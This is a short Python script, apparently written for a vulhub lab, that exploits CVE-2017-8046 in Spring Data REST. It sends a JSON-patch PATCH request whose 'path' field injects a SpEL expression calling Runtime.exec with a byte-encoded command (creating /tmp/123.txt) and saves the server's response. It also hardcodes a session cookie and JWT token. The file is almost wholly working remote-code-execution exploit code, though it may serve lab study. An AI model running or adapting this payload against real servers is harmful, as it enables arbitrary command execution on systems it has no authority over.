'''
Author: yhh
Date: 2022-09-06 21:03:05
LastEditTime: 2022-09-07 13:31:57
LastEditors: yhh
Description: 
FilePath: \PythonFile\spring.py
yhh
'''
import requests
import os

def post_spring(socket,file_path):
    headers = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
        "Accept-Encoding": "gzip, deflate",
        "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6",
        "Cache-Control": "max-age=0",
        "Connection": "close",
        "Host": "192.168.1.221:8081",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.63",
        "Content-Type": "application/json-patch+json",
        "Content-Length": "208",
        "Cookie":"JSESSIONID=9C95EF23DE3FC3B87491660A23C0C4CB; vue_admin_template_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImFkbWluIiwiZXhwIjoxNjYyNzk3ODcwLCJlbWFpbCI6IiJ9.qK_cYlbq6SA8q_PutvSf02l3GDMJmIl1TF5pMdxawwA",
        
    }

    url = f"http://{socket}/customers/1"   #fstring
    file_path = os.path.join(os.path.dirname(__file__), file_path)
    data = '[{ "op": "replace", "path": "T(java.lang.Runtime).getRuntime().exec(new java.lang.String(new byte[]{116,111,117,99,104,32,47,116,109,112,47,49,50,51,46,116,120,116}))/lastname","value":"vulhub"}]'
    try:
        r = requests.patch(url,headers=headers,data=data)
        # 将返回的数据写入文件(覆盖)

        with open(file_path, "w") as f:
            f.write(r.text)
        #print(r.text)
    except Exception as e:
        print(e)

if __name__ == "__main__":
    post_spring("192.168.1.221:8081",'responseCVE2017-8046_3.json')